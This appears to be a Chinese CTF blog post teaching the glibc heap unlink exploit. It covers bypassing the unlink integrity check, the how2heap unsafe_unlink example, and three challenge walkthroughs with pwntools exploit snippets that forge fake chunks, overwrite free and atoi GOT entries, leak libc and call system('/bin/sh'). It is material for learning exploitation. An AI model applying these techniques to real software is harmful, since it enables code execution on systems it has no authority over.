---
layout: post
title: 堆利用(二)之unlink
tags:
  - unlink
categories:
  - 二进制
author: 1ss4k
date: 2021-01-22 16:13:00
---
### 基础知识



连续free的堆块，会被合并，放入unsorted bin中。



之前unlink的宏定义

```c
#define unlink(P, BK, FD) {

 FD = P->fd;                //FD = *P + 8;
 BK = P->bk;               // BK = *P + 12;
 FD->bk = BK;             //  FD + 12 = BK; 
 BK->fd = FD;            //   BK + 8 = FD; 

}
```

相当于当前的P向它的前一个堆块合并。

现在的unlink：

```c
#define unlink(P, BK, FD) {                                            
\    FD = P->fd;                                                          
\    BK = P->bk;                                                          
\    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                
  \      malloc_printerr (check_action, "corrupted double-linked list", P); 
\    else {                                                               
  \      FD->bk = BK;                                                       
  \      BK->fd = FD;                                                       
}
}
```

现在利用的条件：

满足**FD->bk = P  && BK->fd = P**



```python
define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                   \FD = 0x602268
    BK = P->bk;                                   \BK = 0x602270
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))    \FD->bk  = *(0x602268+0x18) | *(0x602280) = P 
	\ BK->fd = *(0x602270+0x10) = *(0x602280) = P ,绕过！              
             malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    FD->bk = BK;                                  \*(0x602268+0x18) | *(0x602280)  = 0x602270
    BK->fd = FD;                                  \ *(0x602270+0x10) | *(0x602280) = 0x602268
    ...
```



对于32位，fd设为(&P - 3X4)，bk设为(&P - 2 X 4)

对于64位，fd设为(&P - 3X8)，bk设为(&P - 2 X 8)

最终的效果就是chunk里面写上了FD的值。

前提：要求PIE没有开启！(PIE会使得基址可变)



参考示例代码 https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c

```python
0x603430:	0x0000000000602048	0x0000000000602050
```

以上分别是fd、bk位置的值。


![upload successful](/images/pasted-183.png)

修改chunk1的pre_chunk_size字段和size字段，以便于在free(chunk1)的时候，可以合并我们构造的这个伪堆块。

语句`chunk1_hdr[0] = malloc_size;`，将堆块1的pre_size设置为malloc_size的大小，即0x80。


![upload successful](/images/pasted-184.png)


语句`chunk1_hdr[1] &= ~1;`，与1进行异或，将最后的inuse位设为0。


![upload successful](/images/pasted-185.png)


free chunk1之后

![upload successful](/images/pasted-186.png)



![upload successful](/images/pasted-187.png)


原来chunk0_ptr指向的值chunk0的位置，现在指向&chunk0_ptr-3的地方


![upload successful](/images/pasted-188.png)

`0x48+0x18 = 0x60`



```c
chunk0_ptr[3] = (uint64_t) victim_string //其实就是chunk0_ptr[3] =chunk0_ptr[0] =  &victim_string 
```


![upload successful](/images/pasted-189.png)


![upload successful](/images/pasted-190.png)



此时再去修改chunk0[0]的值，改的是原来字符串的值

```c
chunk0_ptr[0] = 0x4141414142424242LL;
```


![upload successful](/images/pasted-191.png)



即我们可以在 `&chunk`中实现任意读写。



### 例题



例题1:chunk

add 3个块

```python
add(3,0x100)
add(4,0x100)
add(5,0x100)
```

查看真实的大小，发现是0x111

![upload successful](/images/pasted-192.png)

```python
py = ''
py += p64(0) + p64(0x101) #从0x603010开始，presize设为真实的size - 0x10
py += p64(3)*30 #填充

py += p64(0x100) + p64(0x110)  #pre_inuse 设为0，presize设为0x100
```



下面往fake_chunk里面写fd指针的bk指针的值。

ida找到chunk的地址为0x602280，我们要合并的是3号块，地址是`0x602280 + 8*3`

![upload successful](/images/pasted-193.png)

```python
ptr = 0x602298
fd = ptr - 0x18
bk = ptr - 0x10
```



此时堆块已经伪造好了。


![upload successful](/images/pasted-194.png)

fd->bk = 0x602280 + 0x18 = 0x602298

bk->fd = 0x602288 + 0x10 = 0x602298

所以绕过了检查。接下来free下一个堆块。

效果是：两个堆块合并，所以前一个堆块大小变大了，并且fd和bk的值都变了。

![upload successful](/images/pasted-195.png)

并且往原来的地址0x602298处 写入了 值0x602280 。


![upload successful](/images/pasted-196.png)


再次edit 3号块，就会edit 0x602280地址处的内容。`edit(3,0x20,'AAA')`


![upload successful](/images/pasted-197.png)


接下来往0x602280处写入free_hook的地址。`free_hook = libc_base + libc.sym["__free_hook"]`

再往free_hook里面写入system 

再次free一个堆块的时候，参数设置为/bin/sh，即可getshell。



例题2: uunlink

注意：此题没有show功能。

![upload successful](/images/pasted-198.png)


先malloc几个堆块。然后ida中找到chunk的地址，就是我们的ptr。此处是`0x602300`

![upload successful](/images/pasted-199.png)


下面构造fake_chunk。构造好之后，ida查看delete函数的地址是400BA0，free函数的是0x400730，设断点进行调试。

有以下两种方式

```python
#debug(0x400730,0) 
#gdb.attach(p,"b *0x400BA0")
```



free之后，堆块内容如下


![upload successful](/images/pasted-200.png)


在此edit 0号块，其实是从 0x602300 - 0x18处开始编辑的。


![upload successful](/images/pasted-201.png)


调试的时候发现调用了

```python
atoi_got = elf.got["atoi"] #0x602060
free_got = elf.got["free"] #0x602018
puts_plt = elf.sym["puts"] #0x400740
```



```python
py = ''
py += 'a'*0x18   #填充
py += p64(atoi_got)	#0号块
py += p64(atoi_got)	#1号块
py += p64(free_got)	#2号块
py += p64(9)*6 #填充
edit(0,0x60,py)
```


![upload successful](/images/pasted-202.png)


这一步会让堆块指向我们填入的地址。再次edit堆块的时候，其实edit的是填入地址的值。

```python
edit(2,0x10,p64(puts_plt)) #将原来的free改成puts_plt

free(0) #其实就是输出0号块
rc(1)
addr = u64(rc(6).ljust(8,'\x00'))-libc.sym["atoi"] #减掉偏移
print "addr--->"+hex(addr) #输出的是基地址
system = addr + libc.sym["system"] #system的地址
```

地址如下：

![upload successful](/images/pasted-203.png)

接下来将1号块改为`system`的地址`edit(1,0x10,p64(system))`

![upload successful](/images/pasted-204.png)

再次调用atoi函数的时候，就会跳转到system。

![upload successful](/images/pasted-205.png)

ida中查看发现，每次最开始输入完菜单之后，都会运行一次atoi，所以再次直接输入参数/bin/sh即可getshell

```python
ru("Your choice: ")
sl('/bin/sh\x00')
```



例题3: stkof



程序运行时没有提示


![upload successful](/images/pasted-206.png)

首选构造的fake_chunk如下

![upload successful](/images/pasted-207.png)

覆盖下一个堆块的size头后，如下

![upload successful](/images/pasted-208.png)

free之后，2号和3号合并。再edit 2号块，实际上就是在edit  ptr - 0x18的位置处的值。

`edit(2,0x10,'AAA')`


![upload successful](/images/pasted-209.png)


```python
py1 = ''
py1 += p64(0) + p64(atoi_got) + p64(puts_got) + p64(free_got)
edit(2,len(py1),py1)
```

![upload successful](/images/pasted-210.png)


此时0x602150处的值是0x602018，再次edit 2号块，实际上edit的是0x602018处的值。原本是free函数，就会把其改成相应的值。


![upload successful](/images/pasted-211.png)


```python
py2 = ''
py2 += p64(puts_plt)
edit(2,len(py2),py2)
```

这样就把free函数改成了puts_plt。


![upload successful](/images/pasted-212.png)

free所在的堆块号为2，前面的puts_got为堆块1。用puts_plt泄漏出pus_got的地址 `puts_addr--->0x7ffff7a7c6a0`

然后就可以找到system的地址。

```python
system = puts_addr - libc.symbols["puts"] + libc.symbols['system']
```



刚才覆盖的atoi的堆块为0号，将其改为system


![upload successful](/images/pasted-213.png)

直接传入参数/bin/sh即可。


![upload successful](/images/pasted-214.png)


本题可参考如下文章 https://wzt.ac.cn/2018/10/16/s-pwn-project-4/